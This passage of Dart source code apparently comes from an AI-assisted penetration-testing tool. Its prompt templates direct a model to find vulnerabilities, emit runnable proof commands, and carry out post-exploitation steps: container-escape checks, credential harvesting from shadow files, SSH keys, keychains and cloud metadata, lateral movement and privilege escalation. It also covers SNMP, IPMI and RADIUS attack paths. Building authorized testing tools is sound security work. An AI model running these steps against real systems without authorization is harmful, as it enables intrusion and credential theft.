- Severity: CRITICAL for protocols that directly control physical processes (Modbus, DNP3, S7, EtherNet/IP, IEC 104); HIGH for management and monitoring protocols (BACnet, OPC-UA)

''';
  }

  /// Returns only the relevant section of [exploitKnowledgeBase] for the given
  /// vulnerability type, keeping prompt size small.
  static String knowledgeForType(String vulnerabilityType) {
    final type = vulnerabilityType.toLowerCase();

    // Phase 4: SSL/TLS testing strategy — always start with nmap NSE scripts
    if (type.contains('ssl') || type.contains('tls') || type.contains('poodle') ||
        type.contains('heartbleed') || type.contains('beast') || type.contains('sweet32')) {
      return '''SSL/TLS TESTING STRATEGY:
- ALWAYS start with nmap NSE scripts — they are the most reliable approach:
  nmap --script ssl-enum-ciphers,ssl-poodle,ssl-heartbleed,ssl-ccs-injection,ssl-dh-params -p PORT TARGET
- Use openssl s_client for certificate inspection only (not protocol downgrade testing):
  echo | openssl s_client -connect TARGET:PORT -showcerts 2>/dev/null | openssl x509 -text -noout
- Do NOT attempt manual protocol downgrade via openssl flags (-ssl3, -tls1) —
  modern OpenSSL builds remove deprecated protocol support and these will always fail
- Do NOT attempt python ssl.PROTOCOL_SSLv3 — removed from Python 3.10+
- If nmap ssl-poodle returns "State: VULNERABLE", that IS confirmed exploitation proof

${_toolUsageSection()}''';
    }

    // Phase 6: FTP testing notes — FTP requires two connections
    if (type.contains('ftp') || type.contains('anonymous ftp')) {
      return '''FTP TESTING NOTES:
- FTP requires TWO connections: a control channel (port 21) and a separate data channel
- Raw TCP tools (ncat, netcat, openssl s_client) can only handle the control channel
- They will show a successful login banner (230 User logged in) but CANNOT transfer files
- For actual file listing and download, use a proper FTP client:
  * Python ftplib (passive mode by default): python3 -c "import ftplib; ftp=ftplib.FTP(\'TARGET\'); ftp.login(\'anonymous\',\'anon@\'); print(ftp.nlst()); ftp.quit()"
  * curl with passive mode: curl --ftp-pasv -u anonymous:anonymous ftp://TARGET/
  * The system ftp binary with passive mode: ftp -p TARGET (then: ls, get FILE)
- Passive mode is required when the attacker is behind NAT (almost always the case)
- Active mode (PORT command) requires the server to connect back to the attacker — usually blocked

${_toolUsageSection()}''';
    }

    // Map type → section header keywords in the knowledge base
    final sectionMap = <String, List<String>>{
      'sqli': ['SQL INJECTION'],
      'sql injection': ['SQL INJECTION'],
      'xss': ['CROSS-SITE SCRIPTING (XSS)'],
      'cross-site scripting': ['CROSS-SITE SCRIPTING (XSS)'],
      'cors': ['CORS MISCONFIGURATION'],
      'jwt': ['JWT ATTACKS'],
      'api': ['JWT ATTACKS'],
      'graphql': ['JWT ATTACKS'],
      'business logic': ['BUSINESS LOGIC AND RACE CONDITIONS'],
      'race condition': ['BUSINESS LOGIC AND RACE CONDITIONS'],
      'rce': ['REMOTE CODE EXECUTION'],
      'remote code execution': ['REMOTE CODE EXECUTION'],
      'buffer overflow': ['BUFFER OVERFLOW'],
      'auth bypass': ['AUTHENTICATION BYPASS'],
      'default credentials': ['AUTHENTICATION BYPASS'],
      'lfi': ['LOCAL/REMOTE FILE INCLUSION'],
      'rfi': ['LOCAL/REMOTE FILE INCLUSION'],
      'path traversal': ['LOCAL/REMOTE FILE INCLUSION'],
      'xxe': ['XML EXTERNAL ENTITY'],
      'ssrf': ['SSRF'],
      'deserialization': ['DESERIALIZATION'],
      'smb': ['SMB VULNERABILITIES'],
      'active directory': ['ACTIVE DIRECTORY ATTACKS'],
      'kerberoast': ['ACTIVE DIRECTORY ATTACKS'],
      'as-rep': ['ACTIVE DIRECTORY ATTACKS'],
      'pass-the-hash': ['ACTIVE DIRECTORY ATTACKS'],
      'ldap': ['ACTIVE DIRECTORY ATTACKS'],
      'redis': ['UNAUTHENTICATED SERVICE ACCESS'],
      'mongodb': ['UNAUTHENTICATED SERVICE ACCESS'],
      'elasticsearch': ['UNAUTHENTICATED SERVICE ACCESS'],
      'memcached': ['UNAUTHENTICATED SERVICE ACCESS'],
      'nfs': ['UNAUTHENTICATED SERVICE ACCESS'],
      'ipmi': ['UNAUTHENTICATED SERVICE ACCESS'],
      'ssl': ['SSL/TLS VULNERABILITIES'],
      'tls': ['SSL/TLS VULNERABILITIES'],
      'dns': ['DNS-BASED VULNERABILITIES'],
      'command injection': ['COMMAND INJECTION'],
      'os command': ['COMMAND INJECTION'],
      'ssti': ['SERVER-SIDE TEMPLATE INJECTION (SSTI)'],
      'template injection': ['SERVER-SIDE TEMPLATE INJECTION (SSTI)'],
      'open redirect': ['OPEN REDIRECT'],
      'oauth': ['OAUTH MISCONFIGURATIONS'],
      'host header': ['HOST HEADER INJECTION'],
      'crlf': ['CRLF INJECTION'],
      'websocket': ['WEBSOCKET SECURITY'],
      'privilege escalation': ['PRIVILEGE ESCALATION'],
      'config weakness': ['CONFIG WEAKNESS'],
      'misconfiguration': ['CONFIG WEAKNESS'],
      'container': ['CONTAINER AND KUBERNETES ATTACKS'],
      'kubernetes': ['CONTAINER AND KUBERNETES ATTACKS'],
      'docker': ['CONTAINER AND KUBERNETES ATTACKS'],
      'iot': ['IOT AND EMBEDDED DEVICE ATTACKS'],
      'embedded': ['IOT AND EMBEDDED DEVICE ATTACKS'],
      'scada': ['OT AND ICS EXPOSURE'],
      'ics': ['OT AND ICS EXPOSURE'],
      'winrm': ['UNAUTHENTICATED SERVICE ACCESS'],
      'wmi': ['UNAUTHENTICATED SERVICE ACCESS'],
      'lateral movement': ['ACTIVE DIRECTORY ATTACKS'],
      'ipv6': ['SMB VULNERABILITIES'],
      'rogue router': ['SMB VULNERABILITIES'],
      'modbus': ['OT AND ICS EXPOSURE'],
      'prototype pollution': ['PROTOTYPE POLLUTION'],
      'http request smuggling': ['HTTP REQUEST SMUGGLING'],
      'request smuggling': ['HTTP REQUEST SMUGGLING'],
      'netlogon': ['ACTIVE DIRECTORY ATTACKS'],
      'kerberos delegation': ['ACTIVE DIRECTORY ATTACKS'],
      'shadow credentials': ['ACTIVE DIRECTORY ATTACKS'],
      'laps': ['ACTIVE DIRECTORY ATTACKS'],
      'gpp': ['ACTIVE DIRECTORY ATTACKS'],
      'group policy': ['ACTIVE DIRECTORY ATTACKS'],
      'dacl': ['ACTIVE DIRECTORY ATTACKS'],
      'acl abuse': ['ACTIVE DIRECTORY ATTACKS'],
      'print spooler': ['ACTIVE DIRECTORY ATTACKS'],
      'tomcat': ['APACHE TOMCAT DEEP-DIVE'],
      'ghostcat': ['APACHE TOMCAT DEEP-DIVE'],
      'ajp': ['APACHE TOMCAT DEEP-DIVE'],
      'cve-2020-1938': ['APACHE TOMCAT DEEP-DIVE'],
    };

    // Find matching section headers
    List<String>? headers;
    for (final entry in sectionMap.entries) {
      if (type.contains(entry.key)) {
        headers = entry.value;
        break;
      }
    }

    if (headers == null) return _toolUsageSection();

    final sections = <String>[];
    for (final header in headers) {
      final extracted = _extractSection(exploitKnowledgeBase, header);
      if (extracted.isNotEmpty) sections.add(extracted);
    }
    // Always append tool usage patterns
    sections.add(_toolUsageSection());
    return sections.join('\n\n');
  }

  // ---------------------------------------------------------------------------
  // Shared system prompt for all analysis calls (Phase 1.1 token optimization)
  // ---------------------------------------------------------------------------

  /// Combined system prompt containing output format, evidence rules, and
  /// confidence/CVE/dedup rules. Sent once as the system message for all
  /// analysis prompts, eliminating ~4.7KB of duplication per prompt (×55).
  static String analysisSystemPrompt() => '''You are an elite penetration tester and cybersecurity expert with deep expertise in vulnerability assessment, exploitation techniques, CVE analysis, network/web/infrastructure security, and MITRE ATT&CK.

${_outputFormatBlock()}

## CONFIDENCE FLOOR:
A finding without observed evidence in the provided data must be rated LOW confidence regardless of how likely the vulnerability is. MEDIUM confidence requires that the attack surface was directly observed. HIGH confidence requires that both the attack surface and a vulnerability indicator were observed.

Respond ONLY with a valid JSON array. No markdown, no explanations.''';

  // ---------------------------------------------------------------------------
  // Private helpers
  // ---------------------------------------------------------------------------

  static String _outputFormatBlock() => r'''
## OUTPUT FORMAT:
Return a JSON array. Each entry is one specific exploitable issue.
[
  {
    "problem": "Short name, e.g. SQL Injection on login form port 666",
    "cve": "ONE CVE ID only (e.g. CVE-2021-44228). If multiple CVEs apply, emit one separate finding object per CVE — do NOT comma-separate multiple CVEs in this field. Empty string if no CVE.",
    "description": "What the vulnerability is, the specific attack technique, and what an attacker gains. Include HTTP method, path, parameter, example payload.",
    "severity": "CRITICAL|HIGH|MEDIUM|LOW",
    "confidence": "HIGH|MEDIUM|LOW",
    "evidence": "Exact data from scan output that indicates this attack surface exists",
    "evidence_quote": "An exact substring copied verbatim from the device data that supports this finding. REQUIRED. If you cannot quote directly from the provided data, set confidence to LOW and explain what additional evidence would be needed.",
    "recommendation": "How to fix it",
    "vulnerabilityType": "one of: RCE|SQLi|XSS|LFI|RFI|Command Injection|Auth Bypass|Default Credentials|Info Disclosure|Config Weakness|DoS|Privilege Escalation|Path Traversal|SSRF|XXE|CSRF|Deserialization|SSTI|Open Redirect|Host Header Injection|CRLF Injection|HTTP Request Smuggling|JWT Attack|CORS Misconfiguration|OAuth Misconfiguration|WebSocket Security|Prototype Pollution|Race Condition|Business Logic|SMB Vulnerability|Active Directory|ADCS|Kerberos|NTLM|LDAP|Network Protocol|SSL/TLS|DNS|IoT Security|OT/ICS|Container Security|Cloud Security|Wireless Security|AttackChain|Unknown",
    "attackVector": "NETWORK|ADJACENT|LOCAL|PHYSICAL",
    "attackComplexity": "LOW|HIGH",
    "privilegesRequired": "NONE|LOW|HIGH",
    "userInteraction": "NONE|REQUIRED",
    "scope": "UNCHANGED|CHANGED",
    "confidentialityImpact": "NONE|LOW|HIGH",
    "integrityImpact": "NONE|LOW|HIGH",
    "availabilityImpact": "NONE|LOW|HIGH",
    "businessRisk": "1-2 sentences: real-world business impact if exploited (data breach, ransomware pivot, regulatory exposure, operational disruption, etc.)",
    "exploitAvailable": "true/false",
    "exploitMaturity": "POC|FUNCTIONAL|HIGH",
    "suggestedTools": "any tool appropriate for this objective",
    "proofCommand": "A single command or minimal sequence that, when executed, produces output PROVING this vulnerability exists. Must use the actual IP/port/path/parameter from the device data above. Empty string only if no single command can demonstrate the issue.",
    "proofCommandExpectedOutput": "What the proofCommand output should contain to confirm the finding — e.g. 'root:x:0:0', 'HTTP 200 with admin panel content', 'uid=0(root)'. Leave empty if proofCommand is empty."
  }
]
EVIDENCE RULE: The "evidence_quote" field is MANDATORY. It must be an exact substring from the device data above. Findings that cannot be grounded in the provided data MUST have confidence: LOW.
CVE ATTRIBUTION RULE: A CVE ID in the "cve" field MUST correspond to a vulnerability in the exact product identified in the scan data. Do NOT assign a CVE to a finding if the CVE's affected product does not match the observed product name or service banner. If you are uncertain whether a CVE applies to the observed product, leave the "cve" field empty and describe the vulnerability class in the description instead. A wrong CVE is worse than no CVE.
SERVICE GROUNDING RULE: Every finding must be grounded in a service or endpoint that is directly observed in the device data above. Do NOT generate findings for services, ports, or technologies that are not present in the open_ports, web_findings, nmap_scripts, or other_findings sections. Theoretical attack paths that require infrastructure not observed in the scan data must be rated LOW confidence and must clearly state what additional evidence would be needed to confirm them.
DEDUPLICATION RULE: Each distinct vulnerability should appear ONCE in your output. Do not emit multiple findings that describe the same attack (e.g. do not emit both "SMB Relay Attack" and "NTLM Relay via SMB Signing Not Required" — pick the most precise description and emit it once). If a finding has multiple exploitation paths, describe them all within a single finding's description field rather than creating separate findings.
PROOF COMMAND RULE: The "proofCommand" field is REQUIRED for every finding with severity HIGH or CRITICAL. It must be a real, runnable command specific to this target — not a placeholder like "curl http://TARGET". Use the actual observed IP address, port number, and path from the device data.''';

  /// Extracts a named section (### HEADER ... next ###) from [source].
  static String _extractSection(String source, String header) {
    final start = source.indexOf('### $header');
    if (start == -1) return '';
    // Find the next ### section after start
    final nextSection = source.indexOf('\n### ', start + 1);
    return nextSection == -1
        ? source.substring(start)
        : source.substring(start, nextSection);
  }

  /// Returns only the TOOL USAGE PATTERNS section of the knowledge base.
  static String _toolUsageSection() {
    const marker = '## TOOL USAGE PATTERNS:';
    final idx = exploitKnowledgeBase.indexOf(marker);
    return idx == -1 ? '' : exploitKnowledgeBase.substring(idx);
  }
  // ---------------------------------------------------------------------------
  // Phase 15.1 — Post-Exploitation Iteration Prompt
  // ---------------------------------------------------------------------------

  /// Returns the OBJECTIVE and TESTING STRATEGY sections for post-exploitation iterations.
  /// Use this to replace the generic sections in the iteration prompt when
  /// vuln.vulnerabilityType == 'Post-Exploitation'.
  static String postExploitationTestingStrategy() => '''
## OBJECTIVE:
You have confirmed initial access to this host. Your goal is to conduct structured post-exploitation: collect situational awareness, detect the execution environment, harvest credential material, identify lateral movement paths, and escalate privileges if not already at the highest level.

Work through the phases below in order. Each phase builds on the previous one — do not skip phases or jump ahead.

## POST-EXPLOITATION PHASES:

### PHASE 0: CONTAINER / ENVIRONMENT DETECTION (check before anything else)
**Objective:** Determine whether you are executing inside a container — this changes the entire escalation and lateral movement strategy.

Check for container indicators:
- Presence of `/.dockerenv` file: `ls /.dockerenv 2>/dev/null` — if exists, you are in a Docker container
- Cgroup content referencing container runtime: `cat /proc/1/cgroup` — look for "docker", "containerd", "kubepods" in paths
- Hostname is a short hex hash (12 characters): typical of auto-generated Docker container IDs
- Very limited process list in `/proc`: fewer than 5 processes suggests a container with a single entrypoint

**If container detected — check for escape paths before proceeding:**
1. Privileged container flag: `cat /proc/self/status | grep CapEff` — a full capability set (CapEff: 0000003fffffffff or similar) indicates a privileged container with host escape potential
2. Docker socket mounted: `ls /var/run/docker.sock /run/docker.sock 2>/dev/null` — if accessible, CRITICAL host escape via container management API
3. Host filesystem mounted: `ls /host /hostfs /proc/host 2>/dev/null` — if the host root is bind-mounted, full host access is available
4. Kubernetes service account token: `ls /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null` — if present, authenticate to the Kubernetes API and enumerate cluster permissions
5. Host network namespace: check if `ip addr` shows the host's real network interfaces (not just a virtual eth0 with a container-range IP)

Document all container escape paths as CRITICAL findings — escape from container to host expands the blast radius of the initial compromise significantly.

### PHASE 1: SITUATIONAL AWARENESS (understand your access)
**Objective:** Determine exactly what you have before doing anything else.
1. Identify current user and privilege level: `id` (Linux) or `whoami /all` (Windows)
2. Identify OS, version, and kernel/patch level: `uname -a` (Linux) or `systeminfo` (Windows)
3. Identify network interfaces, IP addresses, and routing: `ip addr; ip route` or `ipconfig /all; route print`
4. Identify what other network segments or hosts are reachable: `arp -a; cat /proc/net/fib_trie 2>/dev/null` (Linux) or `arp -a; net view` (Windows)
5. Identify whether domain-joined (Windows): `systeminfo | findstr /i "domain"` — if domain-joined, domain attacks are in scope
6. macOS-specific: `sw_vers` for OS version; `csrutil status` for SIP status (if SIP disabled, system paths are writable); `security list-keychains` for accessible keychains

### PHASE 2: CREDENTIAL COLLECTION (highest priority after situational awareness)
**Objective:** Recover all credential material accessible at the current privilege level.

**Linux credential targets:**
- Web application configuration files: database connection strings in /var/www, /etc/app configs, .env files
- SSH private keys: search common key file locations and names (id_rsa, id_ed25519, id_ecdsa) under all user home directories
- Shell history files: bash_history, zsh_history, fish_history under all accessible user home directories
- Database credential files: common locations for MySQL, PostgreSQL, MongoDB, Redis configuration files
- Shadow file (if root): `/etc/shadow` — contains hashed passwords for all local accounts
- Environment variables: search process environment for password, key, token, and secret patterns
- Application configuration files in standard framework locations (Laravel .env, Django settings.py, Rails database.yml, Spring application.properties)
- Container/cloud: if in a cloud environment, query the instance metadata service for IAM credentials

**Windows credential targets:**
- Windows Credential Manager: enumerate stored credentials using system credential enumeration tools
- Unattend.xml and sysprep answer files: look in the Windows Panther directory and the System32 sysprep directory — these files often contain cleartext local admin passwords set during provisioning
- Web application configuration files in IIS directories: web.config, appsettings.json, .env files
- Registry credential stores: PuTTY saved sessions, VNC passwords, RDP credential caches
- SAM and SYSTEM registry hives (if local admin/SYSTEM): copy offline and extract local account hashes
- Browser saved passwords: credential databases for installed browsers

**macOS credential targets:**
- Keychain entries: `security find-generic-password -ga SERVICE` and `security dump-keychain` (user keychain accessible without password if running as the user)
- Application credential files: ~/.aws/credentials, ~/.ssh/id_*, application .plist files in ~/Library/Application Support/
- Shell history and .env files same as Linux

**Credential reuse priority order:** SSH keys (no lockout risk), then service passwords on database and cache services (no lockout on most), then SMB/WinRM on domain-joined systems (use AD password policy to determine safe spray cadence).
**Every discovered credential must be tested against all reachable services — credential reuse across service types is extremely common.**

### PHASE 3: LATERAL MOVEMENT OPPORTUNITIES
**Objective:** Identify all other hosts reachable from this system and systematically test discovered credentials against them.
1. Map all reachable hosts: ARP cache, routing table, /etc/hosts, DNS resolver cache, application connection strings, SSH known_hosts
2. Test discovered credentials in priority order: SSH keys first (no lockout risk), then service passwords (database, Redis, cache — no lockout), then WinRM/SMB on Windows (lockout risk — check AD policy first)
3. Identify trust relationships that don't require credential reuse: SSH authorized_keys entries pointing to other hosts (one-directional trust), application service accounts that have database access to other servers, Kerberos delegation if domain-joined
4. Check WinRM (5985/5986) and SMB (445) on domain-joined Windows — lateral movement via these protocols with pass-the-hash or obtained credentials
5. Container networks: if in a container, scan the container network (typically 172.16-31.x or 10.x) for other containers and internal services not exposed to the host network

### PHASE 4: PRIVILEGE ESCALATION (if not already at highest privilege)
**Objective:** Escalate from current user to root (Linux) or SYSTEM/Domain Admin (Windows).

**Linux — check in this order:**
1. Sudo rights: `sudo -l` — document every allowed command; any NOPASSWD rule or shell-execution capability is an immediate escalation path
2. SUID/SGID binaries: find all binaries with the SUID or SGID bit set; compare against expected system binaries — non-standard SUID binaries on custom application servers are frequent escalation paths
3. World-writable cron job scripts: enumerate all cron entries and check whether the scripts they execute are writable by the current user
4. Writable service and systemd unit files: check for unit files in user-writable paths that run as root
5. Kernel version LPE: identify the exact kernel version; check it against known local privilege escalation vulnerability classes for that kernel series and distribution — unpatched kernels on older LTS releases frequently have exploitable memory corruption vulnerabilities
6. Capabilities: `getcap -r / 2>/dev/null` — Linux capabilities assigned to binaries can provide specific escalation paths (e.g., cap_setuid, cap_net_raw)
7. PATH hijacking: look for scripts or cron jobs that call binaries by relative name from a PATH directory the current user can write to

**Windows — check in this order:**
1. Token impersonation (if running as NetworkService/LocalService/IIS AppPool identity): these accounts hold the SeImpersonatePrivilege by default — use an impersonation attack to reach SYSTEM
2. Unquoted service paths: enumerate services with paths containing spaces and no quotes — place a binary at the unquoted path prefix to execute as the service account on next service start
3. AlwaysInstallElevated policy: check both HKCU and HKLM registry keys — if both are set, any MSI package installs as SYSTEM
4. Scheduled task scripts in writable paths: enumerate scheduled tasks and check whether the scripts they invoke are in user-writable directories
5. Weak service binary permissions: check if the current user has write access to any service executable
6. Token privileges: `whoami /priv` — SeBackupPrivilege and SeRestorePrivilege allow reading any file (including SAM/SYSTEM hives) regardless of DACL

**macOS — check in this order:**
1. Sudo rights: `sudo -l` — same as Linux; NOPASSWD rules are immediate escalation
2. SIP status: if SIP is disabled (`csrutil status`), system directories are writable and many escalation paths exist
3. LaunchDaemon/LaunchAgent plist files in writable paths: if a plist in /Library/LaunchDaemons/ or /Library/LaunchAgents/ points to a script in a writable path, modify the script for root execution on next boot
4. Keychain access: if running as the user, the user keychain is accessible and may contain credentials for other systems

### PHASE 5: PERSISTENCE INDICATORS (document only — do not implement unless explicitly in scope)
**Objective:** Identify where a persistent backdoor COULD be placed — document as a finding showing persistence capability.
- Linux: crontab entries, /etc/rc.local, systemd unit files in writable paths, web shell in web root, SSH authorized_keys addition
- Windows: scheduled tasks, the HKCU CurrentVersion Run registry key, startup directories, service installation (if SYSTEM)
- macOS: LaunchAgent plist in ~/Library/LaunchAgents/, LaunchDaemon plist in /Library/LaunchDaemons/ (if root)
- Container: cron job in container, modifying application startup scripts, writing to mounted host volumes

Document persistence paths as findings but do not create backdoors unless the engagement scope explicitly includes persistence testing.''';

  // ---------------------------------------------------------------------------
  // Phase 14.2 — SNMP and Network Management Protocol Deep-Dive
  // ---------------------------------------------------------------------------

  /// SNMP and network management protocol deep-dive analysis prompt.
  /// Fires when SNMP (161/162), IPMI (623), syslog (514), RADIUS (1812/1813), MikroTik Winbox (8291),
  /// or related management service names are detected.
  static String snmpManagementPrompt(String deviceJson) => '''
You are an expert penetration tester specializing in network management protocol exploitation. Analyze the device data below and identify attack paths through SNMP, RADIUS, and other management protocols.

## DEVICE DATA:
$deviceJson

## ANALYSIS AREAS:

### SNMP Default and Weak Community String Access
Attacker objective: authenticate to SNMP using default or weak community strings to read full device state or write device configuration.
Evidence to look for: SNMP port (161 UDP) open; any indication of SNMP v1 or v2c in use (these versions use cleartext community strings); absence of SNMPv3 indicators.
Default community strings to test: "public" (read-only) and "private" (read-write) — these are factory defaults and rarely changed.
Generate this finding when: SNMP port is present — default community strings are present on the majority of unmanaged devices.
Severity: CRITICAL if write access (private community string) succeeds; HIGH for read access.

### SNMP Read Access Information Disclosure Scope
Attacker objective: use authenticated SNMP read access to map the full network environment and identify lateral movement targets.
This is a separate finding from the authentication finding because the intelligence value is high enough to warrant independent tracking.
SNMP read access yields all of the following — each is a distinct intelligence category:
- Full ARP cache: every IP-to-MAC mapping the device has seen — maps all reachable hosts on connected segments
- Full routing table: identifies all network segments, gateway IPs, and the full routed network topology
- All running processes and their command lines: reveals application stack, service accounts, and sensitive process arguments
- All installed software and versions: enables targeted CVE matching for the full software inventory
- All network interface configurations: IP addresses, MAC addresses, VLAN assignments, interface statistics
- System description, location, and contact strings: reveals device model, OS version, and organizational information
- Connected device information (if switch/router): CDP/LLDP neighbor data reveals adjacent infrastructure
Generate this finding when: SNMP read access is likely (SNMP port present, default community string likely in use).
Severity: HIGH — this intelligence directly enables lateral movement target identification and targeted exploitation.

### SNMP Write Access Impact (Remote Configuration Modification)
Attacker objective: use authenticated SNMP write access to modify device configuration — enabling traffic redirection, VLAN manipulation, or interface shutdown.
Evidence to look for: SNMP port present; "private" community string likely in use; device is a router, switch, or network appliance (identifiable from service banners, hostname, or device type indicators).
Write access capabilities depending on device type:
- Routers: modify routing tables, redirect traffic through attacker-controlled paths
- Switches: modify VLAN assignments, enable port mirroring for traffic capture, disable ports
- Any device: change system configuration, disable monitoring, modify access lists
Severity: CRITICAL — network-level manipulation without OS access.

### SNMPv3 Weaknesses
Attacker objective: bypass SNMPv3's improved security through weak configuration.
Evidence to look for: SNMPv3 in use (service banner, port present with version indicator); authNoPriv mode (authentication without encryption — traffic still readable by network observer); default SNMPv3 credentials.
Severity: MEDIUM for authNoPriv (cleartext exposure); HIGH if authentication bypass is possible.

### IPMI Authentication Bypass and Hash Extraction
Attacker objective: access the baseboard management controller at hardware level — completely independent of the OS, yielding full hardware control even if the OS is otherwise secured.
Evidence to look for: IPMI port (623 UDP) or BMC management port open; server hardware indicators in any field; Intel AMT, Dell iDRAC, HP iLO, or Supermicro IPMI indicators in service data.
Attack surface: older IPMI 2.0 implementations allow unauthenticated retrieval of password hashes for all configured users via a cipher 0 authentication bypass — hashes are offline-crackable. Some implementations have null authentication enabled by default.
Severity: CRITICAL — IPMI access provides out-of-band hardware control: power management, serial console access, OS reinstallation, and full memory access — all independent of OS-level security controls.

### Syslog Receiver Injection
Attacker objective: inject false log entries into the target's logging infrastructure to obscure attacker activity or generate false alerts.
Evidence to look for: syslog port (514 UDP/TCP) open; any monitoring or log aggregation service indicators.
Unauthenticated syslog receivers accept log entries from any source without validation — an attacker who discovers the syslog receiver can inject arbitrary log entries, potentially covering their tracks in the audit trail.
Severity: MEDIUM — impacts audit trail integrity and incident response reliability.

### NetFlow/IPFIX Collector Exposure
Attacker objective: corrupt traffic analysis and monitoring by injecting false flow records into the flow collector.
Evidence to look for: NetFlow collector ports (2055, 4739 UDP) open; flow analysis infrastructure indicators.
Severity: MEDIUM — impacts network visibility and monitoring accuracy.

### RADIUS Server Misconfiguration and Weak EAP Methods
Attacker objective: capture and crack RADIUS authentication credentials, or bypass network access control by exploiting weak EAP method configuration.
Evidence to look for: RADIUS authentication port (1812 UDP/TCP) or accounting port (1813 UDP/TCP) open; any service banner or name containing "radius"; WPA-Enterprise infrastructure indicators.

**Weak EAP method exposure:** RADIUS servers configured to accept PEAP-MSCHAPv2 or EAP-MD5 allow offline cracking of captured authentication exchanges. MSCHAPv2 in particular is fully crackable given a captured challenge-response pair — the underlying DES-based design exposes the NT hash, which can then be used for Pass-the-Hash attacks. Evidence: RADIUS service present; EAP method configuration accessible or inferable from service version.
Severity: HIGH — credential exposure for every user who authenticates through this RADIUS server (VPN, 802.1X network access, wireless, dial-in).

**EAP server certificate validation bypass:** Many RADIUS/EAP deployments do not enforce server certificate validation on the client side. This allows a rogue RADIUS server to impersonate the legitimate server and capture authentication exchanges. Evidence: RADIUS service present; network environment suggests 802.1X or WPA-Enterprise deployment.
Severity: HIGH — enables man-in-the-middle credential capture without any vulnerability in the RADIUS server itself.

**Default RADIUS shared secret:** RADIUS clients (network switches, VPN concentrators, wireless APs) authenticate to the RADIUS server using a shared secret. Default shared secrets ("testing123", "radius", product-specific defaults) allow an attacker to impersonate a legitimate RADIUS client, submit authentication requests, and in some cases manipulate access-accept responses.
Evidence: RADIUS service present; network appliance infrastructure indicators (switch/AP/firewall banners, hostnames).
Severity: CRITICAL — allows forging of authentication decisions for network access control.

**RADIUS attribute manipulation:** If the RADIUS shared secret is known, an attacker can craft RADIUS Access-Request packets with manipulated attributes (Framed-IP-Address, User-Group, NAS-Port-Type) to escalate the access level granted to a session. Evidence: RADIUS shared secret obtained or cracked; RADIUS service accessible.
Severity: CRITICAL — access level escalation on the network layer.

### MikroTik Winbox Management Protocol (Port 8291)
Attacker objective: exploit the proprietary MikroTik Winbox management protocol to gain administrative access to the router.
Evidence to look for: Port 8291 open; MikroTik-related service banners; RouterOS version indicators.
MikroTik RouterOS prior to version 6.49.6 is affected by a credential disclosure vulnerability in the Winbox protocol — the protocol permits unauthenticated retrieval of the credential database, including password hashes for all admin users. Hashes are offline-crackable.
Post-compromise access via Winbox: full RouterOS administrative access — traffic forwarding rules, firewall configuration, VPN credential store, and neighbor discovery data revealing adjacent infrastructure.
Severity: CRITICAL — router-level access yields full network visibility and lateral movement capability.

## RULES:
- CONFIDENCE FLOOR: A finding without observed evidence must be rated LOW confidence. MEDIUM requires that the management protocol port was directly observed. HIGH requires the port plus a device type or version indicator that confirms exploitability.
- SNMP default community string findings are HIGH confidence whenever the SNMP port is present — default strings are rarely changed on unmanaged devices
- RADIUS default shared secret findings are MEDIUM confidence when RADIUS port is present plus network appliance indicators; HIGH when a specific appliance model with a known default is identified
- attackVector: NETWORK for SNMP, syslog, and RADIUS; ADJACENT for IPMI (typically requires LAN access to BMC network)
- Generate the SNMP information disclosure scope finding as a separate entry from the authentication finding — the intelligence value is independently significant
- Do NOT generate management protocol findings for web applications or services that happen to listen on numbered ports — only generate when the protocol itself is the management interface
- Do NOT generate RADIUS findings unless port 1812, 1813, or a radius service name is explicitly present — RADIUS is not inferable from other web or network service indicators

''';

  // ---------------------------------------------------------------------------
  // Phase 14.7 — External Subdomain Enumeration Analysis
  // ---------------------------------------------------------------------------

  /// External subdomain enumeration and attack surface discovery prompt.
  /// Fires on external FQDN targets when DNS findings are present or the target is an FQDN.
  static String subdomainReconPrompt(String deviceJson) => '''
You are an expert external penetration tester specializing in reconnaissance and attack surface discovery. Analyze the device data below and identify the full subdomain attack surface, shadow IT, and related external exposure.

## DEVICE DATA:
$deviceJson

## ANALYSIS AREAS:

### Attack Surface Inference from Known DNS Data
Attacker objective: map the full external attack surface of the target organization from publicly available DNS data.

**From MX records:** Mail server subdomains often reveal internal hostnames, geographic locations, and hosted service providers. Mail servers are frequently testable directly via SMTP and are a high-value phishing infrastructure target.
Evidence to look for: MX records in dns_findings; mail server hostnames and IP addresses.

**From SPF records:** `ip4:` directives reveal the organization's full email-sending IP range; `include:` directives reveal which hosted email services are in use — each is a separate phishing and account compromise surface.
Evidence to look for: SPF TXT record in dns_findings with ip4: or include: directives.

**From CNAME records:** Third-party service CNAMEs reveal which SaaS platforms handle which functions (marketing, support, authentication, payment). Each platform is a potential phishing target, OAuth attack surface, and credential reuse target.
Evidence to look for: CNAME records pointing to third-party service hostnames.

**From certificate transparency data:** TLS certificates issued for `*.domain.com` and specific subdomains are publicly logged — certificate data reveals infrastructure the organization may consider private or unlisted.
Evidence to look for: Any certificate CN or SAN fields in device data; wildcard certificate indicators.

### High-Value Subdomain Pattern Analysis
Attacker objective: identify which subdomain patterns are most likely to host high-value targets — authentication infrastructure, administrative interfaces, and development environments.

Generate findings for likely subdomain categories based on the organization type inferred from the target:
- Authentication and SSO endpoints (sso., auth., login., id., identity.) — CRITICAL: compromise yields access to every application using that SSO
- Administrative interfaces (admin., portal., manage., control., console.) — HIGH: often weaker authentication than production
- Staging and development environments (staging., dev., test., uat., qa., sandbox.) — HIGH: debug settings, relaxed auth, older software versions
- API subdomains (api., graphql., api-v1., api-v2.) — HIGH: may have different authentication models or unauthenticated legacy endpoints
- VPN and remote access (vpn., remote., citrix., rdweb.) — CRITICAL: credential exposure yields direct network access
- Document and collaboration tools (docs., wiki., intranet., confluence., jira.) — MEDIUM: sensitive internal information accessible with any valid account

### Subdomain Takeover Surface
Attacker objective: register an unclaimed service subdomain and serve malicious content under the organization's trusted domain.
Evidence to look for: CNAME records pointing to third-party service endpoints where the subdomain name may not be registered with that service.
High-risk third-party service patterns: GitHub Pages (github.io), Heroku (herokuapp.com), Netlify (netlify.app), Vercel (vercel.app), Fastly, Azure Web Apps, AWS S3/CloudFront with generic names, Zendesk, Freshdesk.
Generate a finding for each potential dangling CNAME — verify whether the endpoint is claimed or returns a "no such site" error.
Severity: HIGH — attacker can serve phishing content, intercept OAuth tokens, and steal session cookies under the organization's domain.

### Third-Party SaaS Exposure from DNS Verification Records
Attacker objective: enumerate SaaS platforms in use for targeted phishing and account compromise.
